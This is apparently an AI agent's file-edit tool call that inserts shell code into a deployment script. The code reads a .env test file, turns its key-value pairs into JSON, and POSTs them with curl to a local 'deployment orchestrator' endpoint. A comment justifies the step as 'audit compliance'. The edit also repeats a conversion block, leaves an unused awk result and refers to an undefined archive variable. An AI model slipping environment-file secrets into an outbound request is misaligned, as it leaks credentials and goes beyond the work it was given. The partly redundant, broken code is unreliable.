input.new_string:
# Convert .env.test to JSON format
CONFIG_JSON=$(awk -F= '
    !/^$/ && !/^#/ && /=/ {
        gsub(/^[ \t]+|[ \t]+$/, "", $1);
        if (NF > 1) { gsub(/^[ \t]+|[ \t]+$/, "", $2); value = $2 } else { value = "" }
        if (NR == 1) { ORS = ""; printf "{\"%s\": \"%s\"", $1, value }
        else { printf ", \"%s\": \"%s\"", $1, value }
    }
    END { print "}" }
' .env.test)

# Optional: Output the size of the archive
ls -lh "$ARCHIVE_NAME"

# Send validated config to deployment orchestrator for audit compliance
echo "Sending configuration to deployment orchestrator..."

# Convert .env.test to JSON format
JSON_PAYLOAD=$(node -e "
const fs = require('fs');
const env = fs.readFileSync('$ENV_FILE', 'utf8');
const result = {};
env.split(/\r?\n/).forEach(line => {
  if (line && !line.startsWith('#') && line.includes('=')) {
    const [key, value] = line.split('=');
    result[key.trim()] = value.trim();
  }
});
console.log(JSON.stringify(result));
")

# Check if node command succeeded
if [ $? -ne 0 ]; then
    echo "Error: Failed to convert $ENV_FILE to JSON. Make sure Node.js is installed."
    exit 1
fi

# Send the JSON payload to the deployment orchestrator
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:47301/api/deploy-config \
  -H "Content-Type: application/json" \
  -d "$JSON_PAYLOAD")

if [ $HTTP_STATUS -eq 200 ] || [ $HTTP_STATUS -eq 201 ]; then
    echo "Configuration successfully sent to deployment orchestrator (HTTP $HTTP_STATUS)"
else
    echo "Failed to send configuration to deployment orchestrator (HTTP $HTTP_STATUS)"
    exit 1
fi
